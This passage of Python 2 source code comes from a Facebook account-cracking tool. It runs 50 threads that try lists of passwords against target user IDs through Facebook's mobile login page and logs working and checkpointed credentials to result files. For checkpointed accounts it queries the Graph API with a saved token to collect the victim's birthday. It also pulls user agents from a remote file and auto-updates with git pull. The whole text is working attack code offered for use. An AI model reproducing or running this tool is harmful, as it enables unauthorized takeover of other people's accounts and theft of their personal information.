	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;92mOK\033[0;97m Saved In : results/OK-%s-%s-%s.txt"% (ha, op, ta))
	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;93mCP\033[0;97m Saved In : results/CP-%s-%s-%s.txt\n"% (ha, op, ta))
	
	def main(user):
		global loop, token
		sys.stdout.write('\r \033[0;97m[\033[0;93m*\033[0;97m] Cracking %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		try:os.mkdir("results")
		except OSError:pass
		uid,name=user.split("<=>")
		ss = name.split(" ")
		try:
			os.mkdir('results')
		except OSError:
			pass
		try:
			for asu in pw.split(","):
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': asu, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r  \033[0;92m* --> ' +uid+ '|' + asu + '       ')
					ok.append(uid+'|'+asu)
					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  * --> '+str(uid)+'|'+str(asu)+'\n')
					save.close()
					break
					continue
				if 'checkpoint' in xo:
					try:
						token = open('login.txt').read()
						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
						data = s.get(url).json()
						ttl = data['birthday'].replace("/","-")
						print('\r  \033[0;93m* --> ' +uid+ '|' + asu + '|' + ttl)
						cp.append(uid+'|'+asu+'|'+ttl)
						save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
						save.write('  * --> '+str(uid)+'|'+str(asu)+'|'+ttl+'\n')
						save.close()
						break
					except(KeyError, IOError):
						ttl = " "
					except:pass
					print('\r  \033[0;93m* --> ' +uid+ '|' + asu + '       ')
					cp.append(uid+'|'+asu)
					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  * --> '+str(uid)+'|'+str(asu)+'\n')
					save.close()
					break
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(50)
	p.map(main, id)
	exit("\n \033[0;97m[\033[0;96m#\033[0;97m] Finished")
	
### SETTING UA
def settua():
	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Want to Change User Agent? [Y/t] : ") 
	if ask =="":
		menu()
	elif ask == "y" or ask == "Y":
		try:
			print("\n \033[0;97m[\033[0;93m*\033[0;97m] Type In Chrome Search : My User Agent")
			ua = raw_input(" \033[0;97m[\033[0;96m+\033[0;97m] User Agent : ") 
			save = open(".ua","w")
			save.write(ua) 
			save.close()
			print(" \033[0;97m[\033[0;92m✓\033[0;97m] Successfully Setting User-Agent")
			time.sleep(2)
			menu()
		except KeyboardInterrupt:
			exit()
	elif ask == "t" or ask == "T":
		try:
			ua = s.get("https://raw.githubusercontent.com/avsid/data-anggaxd/main/ua.txt").text.strip()
			save = open(".ua","w")
			save.write(ua) 
			save.close()
			print("\n \033[0;97m[\033[0;92m✓\033[0;97m] Successfully Setting User-Agent")
			time.sleep(2)
			menu()
		except KeyboardInterrupt:
			exit()
	else:
		menu()

if __name__ == '__main__':
	if sys.version[0]!="3":
		python="2.7" if "2.7" in sys.version[0:2] else "2.8"
	else:
		print(" \033[0;97m[\033[0;93m#\033[0;97m] Please Use Python 2 Bro Not Python 3")
		exit(" \033[0;97m[\033[0;91m!\033[0;97m] How To Usage : python2 run.py")
	os.system("git pull")
	login()
